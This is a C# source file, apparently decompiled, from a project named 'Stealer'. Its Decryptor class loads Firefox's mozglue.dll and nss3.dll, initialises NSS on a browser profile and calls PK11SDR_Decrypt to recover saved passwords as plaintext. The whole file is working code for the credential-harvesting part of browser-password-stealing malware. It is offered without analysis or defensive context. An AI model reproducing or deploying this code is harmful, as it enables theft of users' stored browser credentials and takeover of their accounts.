using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Stealer;

internal class Decryptor
{
	private static IntPtr hNss3;

	private static IntPtr hMozGlue;

	private static Nss3.NssInit fpNssInit;

	private static Nss3.Pk11SdrDecrypt fpPk11SdrDecrypt;

	private static Nss3.NssShutdown fpNssShutdown;

	public static bool LoadNSS(string sPath)
	{
		try
		{
			hMozGlue = WinApi.LoadLibrary(sPath + "\\mozglue.dll");
			hNss3 = WinApi.LoadLibrary(sPath + "\\nss3.dll");
			IntPtr procAddress = WinApi.GetProcAddress(hNss3, "NSS_Init");
			IntPtr procAddress2 = WinApi.GetProcAddress(hNss3, "PK11SDR_Decrypt");
			IntPtr procAddress3 = WinApi.GetProcAddress(hNss3, "NSS_Shutdown");
			fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Nss3.NssInit));
			fpPk11SdrDecrypt = (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(procAddress2, typeof(Nss3.Pk11SdrDecrypt));
			fpNssShutdown = (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(procAddress3, typeof(Nss3.NssShutdown));
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void UnLoadNSS()
	{
		fpNssShutdown();
		WinApi.FreeLibrary(hNss3);
		WinApi.FreeLibrary(hMozGlue);
	}

	public static bool SetProfile(string sProfile)
	{
		return fpNssInit(sProfile) == 0L;
	}

	public static string DecryptPassword(string sEncPass)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			byte[] array = Convert.FromBase64String(sEncPass);
			intPtr = Marshal.AllocHGlobal(array.Length);
			Marshal.Copy(array, 0, intPtr, array.Length);
			Nss3.TSECItem tsResult = default(Nss3.TSECItem);
			Nss3.TSECItem tsData = default(Nss3.TSECItem);
			tsData.SECItemType = 0;
			tsData.SECItemData = intPtr;
			tsData.SECItemLen = array.Length;
			if (fpPk11SdrDecrypt(ref tsData, ref tsResult, 0) == 0 && tsResult.SECItemLen != 0)
			{
				byte[] array2 = new byte[tsResult.SECItemLen];
				Marshal.Copy(tsResult.SECItemData, array2, 0, tsResult.SECItemLen);
				return Encoding.UTF8.GetString(array2);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return null;
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
		return null;
	}
}
